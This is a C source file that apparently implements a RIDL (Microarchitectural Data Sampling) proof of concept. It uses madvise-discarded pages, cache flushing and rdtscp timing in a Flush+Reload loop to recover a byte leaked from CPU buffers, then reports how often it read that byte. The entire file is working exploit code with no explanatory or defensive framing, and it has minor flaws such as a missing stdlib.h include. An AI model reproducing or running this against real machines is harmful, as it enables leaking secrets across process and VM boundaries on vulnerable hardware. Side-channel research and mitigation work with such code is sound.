#include <stdio.h>
#include <sys/mman.h>
#include <x86intrin.h>
#include <stdint.h>
#include <string.h>

#define BYTE_VALUES		256
#define PAGE			4096
#define THRESHOLD		100
#define STRIDE			512
#define ROUNDS			10000

int time_access(void *addr) 
{

    int aux = 0;
    uint64_t t0, t1;

    _mm_lfence();
    _mm_mfence();
    t0 = __rdtscp(&aux);
    *(volatile char*)addr;
    t1 = __rdtscp(&aux);
    _mm_lfence();

    return t1 - t0;
}

int* ridl_demand_paging()
{
	int* timing_results = calloc(BYTE_VALUES, sizeof(int));
	char __attribute__((aligned(PAGE))) probe_array[BYTE_VALUES * PAGE];
	memset(probe_array, 0, PAGE*BYTE_VALUES*sizeof(char));
	char* dummy_data = mmap(NULL, PAGE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

	if(dummy_data == MAP_FAILED)
	{
		printf("Couldn't map pageof dummy_data\n");
		exit(-1);
	}

	int rounds = ROUNDS;
	while(rounds--)
	{
		madvise(dummy_data, PAGE, MADV_DONTNEED);

		//	FLUSH
		for(int i = 0; i < BYTE_VALUES; i++)
			_mm_clflush(probe_array + STRIDE*i);
		_mm_mfence();

		// 	RIDL
		char value = *(dummy_data);
		*(volatile char*)&probe_array[value * STRIDE];
		_mm_lfence();

		//	RELOAD
		for (int i = 0; i < BYTE_VALUES; i++)
		{
			int index = (167*i + 23)%BYTE_VALUES;
			int time  = time_access(probe_array + STRIDE*index);
			if(time < THRESHOLD)
				timing_results[index]++;
		}
	}
	return timing_results;
}


int main(char argc, char** argv)
{
	int* timing_results;
	timing_results = ridl_demand_paging();
	int index_max = 0;
	int max_value = 0;

	for (int i = 1; i < BYTE_VALUES; i++)
	{
		if(timing_results[i] > max_value)
		{
			max_value = timing_results[i];
			index_max = i;
		}		
	}
	printf("Read %c (ASCII VALUE: %d) %d times\n", index_max, index_max, max_value);
	printf("Success rate: %f\n", (float)(max_value)/(float)(ROUNDS));
	return 0;
}